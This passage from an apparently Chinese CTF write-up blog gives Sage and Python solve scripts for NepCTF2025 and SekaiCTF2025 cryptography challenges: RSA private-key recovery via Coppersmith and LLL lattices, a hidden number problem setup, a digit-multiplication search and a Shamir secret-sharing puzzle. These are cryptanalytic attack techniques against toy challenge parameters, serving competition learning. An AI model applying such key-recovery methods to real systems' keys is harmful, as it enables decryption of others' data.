class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line">primes = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(primes)</span><br><span class="line">d_low = crt(hints,primes)</span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(e*M))</span><br><span class="line">f = e*d_low -<span class="number">1</span> - x*(N - y + <span class="number">1</span>)</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">676</span>,<span class="number">2</span>^<span class="number">1024</span>),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p_q = <span class="subst">&#123;root[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里<code>Sage</code>不知道发什么癫，解方程有问题，换<code>Python</code>解一下吧，<code>Python</code>还得注意一下大整数才能运行起来<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pq = <span class="number">307418535695879466735463624869957924354358665052136409248678026715718383427120772212039629998693207855281708171850879171131527744317839878812415135610115774273232848128353184128891514282686549164628675031032302196224590402569695631086177519084924289711604045185861705566454491785664136393955640722211793934882</span></span><br><span class="line"></span><br><span class="line">p, q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">res = solve([p*q-N, pq - (p+q)], [p, q])</span><br><span class="line">p, q = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(p*q == N)</span><br><span class="line">e = Integer(e)</span><br><span class="line">p = Integer(p)</span><br><span class="line">d = inverse(e, p-<span class="number">1</span>)</span><br><span class="line">ct = Integer(ct)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(ct, d, p)).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NepCTF&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># NepCTF&#123;larg3r_M0du1u5_1nf0_g1ves_b3773r_b0und5&#125;</span></span><br></pre></td></tr></table></figure></p><p>这就是一个简单的<strong>二元copper</strong>的应用</p><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>这里也可以尝试<strong>构造格</strong></p><p>我们把需要求解的<code>p+q</code>放到等式右边<br>$e<em>d_{low}-1+e</em>k_{1}<em>M-k_{2}</em>(N+1)=k_{2}*(p+q)$<br>可以得到</p><script type="math/tex; mode=display">\left [ \begin{matrix}1&k_1&-k_{2}\\\end{matrix} \right ]*\left [ \begin{matrix}1&0&ed_{low}-1\\0&1&eM\\0&0&N+1\\\end{matrix} \right ]\ =\left [ \begin{matrix}1&k_1&k_{2}(p+q)\\\end{matrix} \right ]</script><p><strong>配平</strong>一下目标向量，<code>k1</code>大概在<strong>333位</strong>这样，<code>k2</code>在<strong>675位</strong>这样，<code>k2(p+q)</code>大概会在<strong>1700位</strong>，所以有</p><script type="math/tex; mode=display">\left [ \begin{matrix}1&k_1&-k_{2}\\\end{matrix} \right ]*\left [ \begin{matrix}2^{1700}&0&ed_{low}-1\\0&2^{1370}&eM\\0&0&N+1\\\end{matrix} \right ]\ =\left [ \begin{matrix}2^{1700}&k_1*2^{1370}&k_{2}(p+q)\\\end{matrix} \right ]</script><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line">primes = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(primes)</span><br><span class="line">d_low = crt(hints,primes)</span><br><span class="line"></span><br><span class="line">mat = [[<span class="number">2</span>^<span class="number">1700</span>, <span class="number">0</span>, e*d_low-<span class="number">1</span>], [<span class="number">0</span>, <span class="number">2</span>^<span class="number">1370</span>, e*M], [<span class="number">0</span>, <span class="number">0</span>, N + <span class="number">1</span>]]</span><br><span class="line">L = Matrix(ZZ, mat)</span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> L.LLL():</span><br><span class="line">    k, K1, _ = res</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">2</span>^<span class="number">1700</span>:</span><br><span class="line">        d = (K1//<span class="number">2</span>^<span class="number">1370</span>)*M + d_low</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">pow</span>(ct,d,N)).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;NepCTF&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样看的话，貌似格更方便一些……</p><h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><p><a href="https://eprint.iacr.org/2018/516.pdf">boneh durfee通过LSBs拔高上界 P30 Section 5</a><br>具体怎么实现不了了之，但感觉是<strong>二元copper</strong>的优化，或者说<strong>二元copper</strong>的<strong>small_roots</strong>是从<strong>boneh durfee算法</strong>中来的？<br>不清楚，反正我套的()</p><h2 id="reference-1"><a href="#reference-1" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP">Crypto全解</a></li><li><a href="https://su1yu4n.github.io/2025/08/01/NepCTF2025-ezRSA2%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3">出题人题解</a></li></ul><h1 id="NepCTF2025-latticebros-待补ing"><a href="#NepCTF2025-latticebros-待补ing" class="headerlink" title="NepCTF2025 - latticebros(待补ing)"></a>NepCTF2025 - latticebros(待补ing)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#已知α的极小多项式为三次多项式f(x),即f(α)=0,且α≈54236.606188881754809671280151541781895183337725393</span></span><br><span class="line"><span class="comment">#上述极小多项式的常数项为a0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> a0,alpha</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt,log2</span><br><span class="line"></span><br><span class="line">d=<span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line">k=sqrt(log2(p))+log2(log2(p))</span><br><span class="line">B = <span class="number">2</span>**<span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> B &lt; p/<span class="number">2</span>**k</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> m &gt; <span class="number">2</span>*sqrt(log2(p))</span><br><span class="line"></span><br><span class="line">samples = []</span><br><span class="line">betas = []</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;samples.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    t = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    beta = random.randint(-B + <span class="number">1</span>, B - <span class="number">1</span>)</span><br><span class="line">    a = (t * alpha - beta) % p</span><br><span class="line">    samples.append((t, a))</span><br><span class="line">    betas.append(beta)</span><br><span class="line"></span><br><span class="line">f.write(<span class="built_in">str</span>(samples))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">assert</span> (betas[i]-samples[i][<span class="number">0</span>]*alpha+samples[i][<span class="number">1</span>])%p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag = long_to_bytes(alpha)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[(541847931463604073209188621415697353813245102261880389530448, 293760933113243563398917466885108625646262447370201484418246), (235213326900086489464935804156966465366154623411555613791270, 660823982268225103178763707015491421784294988488272636270997), (826464884761457937459245903152143755707241416981488127320435, 428521663319038461250005113612781686761766888058391496085911), (589542000504317435156560078533519448295689695687499354390208, 155284353896000150766154807679279597476176668344402166959399), (968823371588600973965757332601758200815345862153455338808286, 870008943690791009196027169525956126827736285614393106689402), (621636099728440147413990266662022925118216803638588918660041, 265635912066749696542909843111997941904342442664219734956888), (426696569424050102229606043215592727790577655338668728275370, 279313121876980354011480010042682666651614765507190502627689), (89450479064580125731654556963306718472532905610952012502649, 465933125964565419295325650759566635253450915499965633327941), (480355476500393865742379469913983270769356894135485925662119, 894041172171871806404285309781862268351135623868845025443422), (842436524669577199024236805258573090764419350786291073287889, 345478552143958037534551648319293899442551000874041707820740), (650054674429185550652935714084022116516082323269321462104664, 441999979283903658157822753439653947343822546158589507765994), (46289431385578693366971976442426853079852982529357847290686, 625618376463384339878849844467050454204685252824782609369180), (71444185449163133531919043374545893927347050624346741281881, 955925578289311966288639224625142299309823207245807788495453), (192579726169321656812883068526498248523814846320328766176253, 626481822474054336470183912297952839011392733501646931370367), (736527635648804640774976580747540045854351230084566721853611, 276626211757586963928788091386096607703513204646314683038338), (177922521867185878959621840269164617147915792720210315529733, 541058782621716573816245900423919799500476442285991532228641), (40610451174818168154306630612571678739921107216052349044576, 727642592899858828601137105077611015328512898368636299587376), (385012983728389322601149562441674995471397288632464238356283, 353921151307105661267278594470212933060655245893209524497156), (750447975601038834764379841158092390933760641866111445401426, 391626416964965737035878375834907580903143512300198923948189), (115058604943298010958881205548782439407592353731185670266593, 491630592857258949793489206081490523001249620510479961058022), (327389234395954477946639629629085910688793716425320663599360, 24975272330009592102362429346350824580378490147041708568130), (115595274689129534885608766476695918464309130165432995990883, 757961876891952019297626599379744405302595090402128271144165), (950804723308776351161744501221236453742418549093165078282534, 20307246759635231945223392614290397512873344480184942904518), (724537610412063699714461780160573528810830178440136810747811, 149681928388378582933943374524511804362928290938917573644613), (340891278018589324130004945217960336392205386747747011263373, 683307718413135477104477081812052183267507312278283317237187), (104379682905784169840335131193505192063050242530811180817410, 715010230598797717533306270232399781090458356371977748416491), (644160326926600986730919713173510327120201404569141824224075, 127877985489410167008195578625004740882394608402141169695352), (549253388716005399852261816416312267100135940382820676807345, 210560134643237517255193955173709174155305784935427470113433), (968265711632086435506163736279856957220961064226797549228006, 273174723915971720522674140326199419265943707917542063022561), (704367622558261900937184683100177434487519780290678439135652, 959106497548134540301589019840013331842784496835379005298630)]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h1 id="SekaiCTF2025-I-Dream-of-Genni"><a href="#SekaiCTF2025-I-Dream-of-Genni" class="headerlink" title="SekaiCTF2025 - I Dream of Genni"></a>SekaiCTF2025 - I Dream of Genni</h1><blockquote><p>I had the strangest dream last night.<br><img src="https://pica.zhimg.com/80/v2-9b1b1527b59468d80a3fc9902213e5e3_1440w.png" alt=""></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter an 8-digit multiplicand: &#x27;</span>))</span><br><span class="line">y = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter a 7-digit multiplier: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">1e6</span> &lt;= y &lt; <span class="number">1e7</span> &lt;= x &lt; <span class="number">1e8</span>, <span class="string">&quot;Incorrect lengths&quot;</span></span><br><span class="line"><span class="keyword">assert</span> x * y != <span class="number">3_81_40_42_24_40_28_42</span>, <span class="string">&quot;Insufficient ntr-opy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dream_multiply</span>(<span class="params">x, y</span>):</span><br><span class="line">    x, y = <span class="built_in">str</span>(x), <span class="built_in">str</span>(y)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(x) == <span class="built_in">len</span>(y) + <span class="number">1</span></span><br><span class="line">    digits = x[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x[<span class="number">1</span>:], y):</span><br><span class="line">        digits += <span class="built_in">str</span>(<span class="built_in">int</span>(a) * <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(digits)</span><br><span class="line"><span class="keyword">assert</span> dream_multiply(x, y) == x * y, <span class="string">&quot;More like a nightmare&quot;</span></span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;75bd1089b2248540e3406aa014dc2b5add4fb83ffdc54d09beb878bbb0d42717e9cc6114311767dd9f3b8b070b359a1ac2eb695cd31f435680ea885e85690f89&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(AES.new(sha256(<span class="built_in">str</span>((x, y)).encode()).digest(), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(ct)).decode())</span><br></pre></td></tr></table></figure><p>这题密码打的标签是<code>misc</code>，确实哈</p><p>题目的意思一目了然，看一下图片就知道了，需要找到另外一组满足条件的八位数和七位数</p><p>自己写不大会，<code>AI</code>不靠谱，春哥写的多线程学不来(我的电脑要跑九个小时)，最后学习一下<strong>官方wp</strong></p><p>八位乘七位，八位的第一位可以直接写下来暂不做考虑，剩下的乘出来都是两位数，所以我们快速一点，可以建立一个元组，储存起来，方便运算调用，也省搜索空间</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pairs = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">if</span> x*y &gt;= <span class="number">10</span>]</span><br></pre></td></tr></table></figure><p>然后是完成题目算法的构建，模十可以得到各个位置的数字，再扩大相应位数，这里相乘了，是以百为基数，最终将数字拼接起来</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">multwo</span>(<span class="params">i, j, digits</span>):</span><br><span class="line">    s, mul = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>((digits+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">        s += (i % <span class="number">10</span>) * (j % <span class="number">10</span>) * mul</span><br><span class="line">        i, j, mul = i // <span class="number">10</span>, j // <span class="number">10</span>, mul * <span class="number">100</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><p>处理函数<code>process</code>，先看这一部分代码，是从低位向高位构建拼接的一个过程，只有每一次的低两位、低三四位、低五六位…是假设目标解的一部分，才会进入下一个递归，然后继续从<code>pairs</code>里面取对，继续判断是否是正解的一部分(这就是剪枝的工作过程)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">mul = <span class="number">10</span>**digits</span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> pairs:</span><br><span class="line">    x2 = a*mul + x</span><br><span class="line">    y2 = b*mul + y</span><br><span class="line">    <span class="keyword">if</span> (multwo(x2, y2, digits+<span class="number">1</span>) - x2*y2) % (<span class="number">10</span>*mul) == <span class="number">0</span>:</span><br><span class="line">        process(x2, y2, digits+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>但这样的话，最终只能得到拼接结果的后七位与相乘的后七位一样(N=7)的结果，所以才会是八位和七位相乘，不然是找不到这样的两个数的</p><p>七位与七位相乘的结果会比拼接的大，此时，根据二者的差值以及<code>y</code>可以构建出第八位，从而得到目标解</p><p>$用数学来表示就是：$<br>$X=d_{8}<em>10^{7}+x$<br>$(d_{8}</em>10^{7}+x)<em>y=d_{8}</em>10^{14}+multwo(x,y,14)$<br>$x<em>y-multwo(x,y,14)=d_{8}</em>10^{14}-d_{8}<em>10^{7}</em>y$<br>$x<em>y-multwo(x,y,14)=d_{8}</em>10^{7}*(10^{7}-y)$<br>$n1需要整除n2才能得到正确的d_{8}，同时确保比10倍小$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> digits == N:</span><br><span class="line">    n1 = x*y - multwo(x, y, N*<span class="number">2</span>)</span><br><span class="line">    n2 = <span class="number">10</span>**N * (<span class="number">10</span>**N - y)</span><br><span class="line">    <span class="keyword">if</span> n1 &lt; <span class="number">10</span> * n2 <span class="keyword">and</span> n1 % n2 == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1//n2&#125;</span><span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pairs = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">if</span> x*y &gt;= <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multwo</span>(<span class="params">i, j, digits</span>):</span><br><span class="line">    s, mul = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>((digits+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">        s += (i % <span class="number">10</span>) * (j % <span class="number">10</span>) * mul</span><br><span class="line">        i, j, mul = i // <span class="number">10</span>, j // <span class="number">10</span>, mul * <span class="number">100</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">x, y, digits, N=<span class="number">7</span></span>):</span><br><span class="line">    <span class="keyword">if</span> digits == N:</span><br><span class="line">        n1 = x*y - multwo(x, y, N*<span class="number">2</span>)</span><br><span class="line">        n2 = <span class="number">10</span>**N * (<span class="number">10</span>**N - y)</span><br><span class="line">        <span class="keyword">if</span> n1 &lt; <span class="number">10</span> * n2 <span class="keyword">and</span> n1 % n2 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1//n2&#125;</span><span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    mul = <span class="number">10</span>**digits</span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> pairs:</span><br><span class="line">        x2 = a*mul + x</span><br><span class="line">        y2 = b*mul + y</span><br><span class="line">        <span class="keyword">if</span> (multwo(x2, y2, digits+<span class="number">1</span>) - x2*y2) % (<span class="number">10</span>*mul) == <span class="number">0</span>:</span><br><span class="line">            process(x2, y2, digits+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">process(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>真的是很有意思的一道题目<strong>oVo</strong></p><h1 id="SekaiCTF2025-SSSS"><a href="#SekaiCTF2025-SSSS" class="headerlink" title="SekaiCTF2025 - SSSS"></a>SekaiCTF2025 - SSSS</h1><blockquote><p>Shamir SendS the Secret to everyone</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SEKAI&#123;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">secret</span>):</span><br><span class="line">  t = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">  <span class="keyword">assert</span> <span class="number">20</span> &lt;= t &lt;= <span class="number">50</span>, <span class="string">&quot;Number of parties not in range&quot;</span></span><br><span class="line"></span><br><span class="line">  f = gen(t, secret)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">    x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt; x &lt; p, <span class="string">&quot;Bad input&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(poly_eval(f, x))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>()) == secret:</span><br><span class="line">    <span class="built_in">print</span>(FLAG)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;:&lt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">degree, secret</span>):</span><br><span class="line">  poly = [random.randrange(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(degree + <span class="number">1</span>)]</span><br><span class="line">  index = random.randint(<span class="number">0</span>, degree)</span><br><span class="line"></span><br><span class="line">  poly[index] = secret</span><br><span class="line">  <span class="keyword">return</span> poly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_eval</span>(<span class="params">f, x</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sum</span>(c * <span class="built_in">pow</span>(x, i, p) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(f)) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  secret = random.randrange(<span class="number">0</span>, p)</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    challenge(secret)</span><br></pre></td></tr></table></figure><p>$不怎么接触Shamir，遂记录一下$</p><p>$根据题目，得到t+1项的t次多项式$</p><script type="math/tex; mode=display">f(x)=c_{0}+c_{1}x+...+Sx^{index}+...+c_{t}x^{t}\pmod p</script><p>$循环t次，输入得到t个点(x_{i},f(x_{i}))，调用两次challenge()$<br>$每次的多项式的系数和位置会不一样，但secret数值固定$</p><p>$正常来说，借助拉格朗日差值公式恢复多项式的所有系数我们需要t+1个不同的点，但此处最多只能获得t个不同的点$</p><p>$下面参考官方wp脚本，写了一下自己的思考$</p><p>$其实还可以这样表示：f(x)=P_{t-1}(x)+C(x-x_{1})(x-x_{2})…(x-x_{t})$</p><p>$ord(Z_p^{*})=p-1，t\ |\ p-1，t=29，t\in 